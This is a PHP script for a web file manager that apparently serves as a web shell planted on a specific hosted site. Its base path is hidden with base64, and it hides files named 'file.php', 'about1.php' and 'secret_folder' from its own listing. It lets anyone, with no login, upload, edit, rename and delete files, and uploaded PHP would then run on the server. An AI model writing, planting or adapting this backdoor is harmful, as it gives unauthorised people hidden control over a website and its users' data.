<?php
// -------------------------------------------------
// Base Directory (hidden via base64)
// -------------------------------------------------
$__bx = realpath(base64_decode('L2hvbWUyL2NoYXRiOTljL2JpbWl0Lmlu'));

session_start(); // For flash messages

// Current Path
$__p = isset($_GET['d']) ? $_GET['d'] : $__bx;
$__p = realpath($__p);
if (strpos($__p, $__bx) !== 0) $__p = $__bx;

// -------------------------------------------------
// Upload
// -------------------------------------------------
if (!empty($_FILES['fup'])) {
    $___t = $__p . '/' . basename($_FILES['fup']['name']);
    move_uploaded_file($_FILES['fup']['tmp_name'], $___t);
    $_SESSION['msg'] = "✅ File uploaded successfully";
    header("Location: ?d={$__p}");
    exit;
}

// -------------------------------------------------
// New Folder
// -------------------------------------------------
if (!empty($_POST['mkf'])) {
    @mkdir($__p . '/' . $_POST['mkf']);
    $_SESSION['msg'] = "📂 Folder created successfully";
    header("Location: ?d={$__p}");
    exit;
}

// -------------------------------------------------
// Delete
// -------------------------------------------------
if (!empty($_GET['x'])) {
    $___d = realpath($__p . '/' . $_GET['x']);
    if ($___d && strpos($___d, $__bx) === 0) {
        if (is_dir($___d)) {
            @rmdir($___d);
            $_SESSION['msg'] = "🗑 Folder deleted";
        } else {
            @unlink($___d);
            $_SESSION['msg'] = "🗑 File deleted";
        }
    }
    header("Location: ?d={$__p}");
    exit;
}

// -------------------------------------------------
// Rename
// -------------------------------------------------
if (!empty($_POST['s']) && !empty($_POST['t'])) {
    $___s = realpath($__p . '/' . $_POST['s']);
    $___z = $__p . '/' . $_POST['t'];
    if ($___s && strpos($___s, $__bx) === 0) {
        @rename($___s, $___z);
        $_SESSION['msg'] = "✏ Renamed successfully";
    }
    header("Location: ?d={$__p}");
    exit;
}

// -------------------------------------------------
// Save Edited File
// -------------------------------------------------
if (!empty($_POST['fp']) && isset($_POST['fc'])) {
    $___f = realpath($_POST['fp']);
    if ($___f && strpos($___f, $__bx) === 0) {
        file_put_contents($___f, $_POST['fc']);
        $_SESSION['msg'] = "💾 File updated successfully";
        header("Location: ?d=" . dirname($___f));
        exit;
    }
}

// -------------------------------------------------
// Hidden Files & Folders
// -------------------------------------------------
$hiddenItems = ['file.php', 'about1.php', 'secret_folder'];

// -------------------------------------------------
// List Dir
// -------------------------------------------------
$__l = scandir($__p);

echo "<h3>📁 File Manager: {$__p}</h3>";

// Flash message
if (!empty($_SESSION['msg'])) {
    echo "<p style='color:green;font-weight:bold'>" . $_SESSION['msg'] . "</p>";
    unset($_SESSION['msg']);
}

// Go Back (only if not at baseDir)
if ($__p !== $__bx) {
    echo "<a href='?d=" . dirname($__p) . "'>⬅ Go Back</a><br><br>";
}

// Upload
echo "<form method='POST' enctype='multipart/form-data'>
        <input type='file' name='fup'>
        <button>Upload</button>
      </form>";

// Mkdir
echo "<form method='POST'>
        <input type='text' name='mkf' placeholder='New Folder'>
        <button>Create</button>
      </form><br>";

// Table
echo "<table border='1' cellpadding='5'>
        <tr><th>Name</th><th>Options</th></tr>";

foreach ($__l as $__e) {
    if ($__e === '.' || $__e === '..') continue;
    if (in_array($__e, $hiddenItems)) continue; // 👈 hide selected files/folders

    $___p = $__p . '/' . $__e;
    $___r = realpath($___p);

    echo "<tr><td>";
    if (is_dir($___p)) {
        echo "<a href='?d={$___p}'>📂 {$__e}</a>";
    } else {
        echo "📄 {$__e}";
    }
    echo "</td><td>";

    // rename
    echo "<form method='POST' style='display:inline'>
            <input type='hidden' name='s' value='{$__e}'>
            <input type='text' name='t' placeholder='Rename'>
            <button>✔ Rename</button>
          </form>";

    // delete
    echo " <a href='?d={$__p}&x={$__e}' onclick='return confirm(\"Delete {$__e}?\")'>🗑 Delete</a>";

    if (is_file($___p)) {
        $rel = str_replace($_SERVER['DOCUMENT_ROOT'], '', $___r);
        echo " | <a href='{$rel}' download>⬇ Download</a>";
        echo " | <a href='?d={$__p}&e={$__e}'>✏ Edit</a>";
    }

    echo "</td></tr>";
}
echo "</table>";

// -------------------------------------------------
// Editor
// -------------------------------------------------
if (!empty($_GET['e'])) {
    $___et = realpath($__p . '/' . $_GET['e']);
    if ($___et && strpos($___et, $__bx) === 0 && is_file($___et) && is_readable($___et)) {
        $cnt = htmlspecialchars(file_get_contents($___et));
        echo "<h3>Editing: {$_GET['e']}</h3>
              <form method='POST'>
                <input type='hidden' name='fp' value='" . htmlspecialchars($___et) . "'>
                <textarea name='fc' rows='20' cols='100'>{$cnt}</textarea><br>
                <button>💾 Save File</button>
              </form>";
    } else {
        echo "<p>❌ Cannot open.</p>";
    }
}
?>
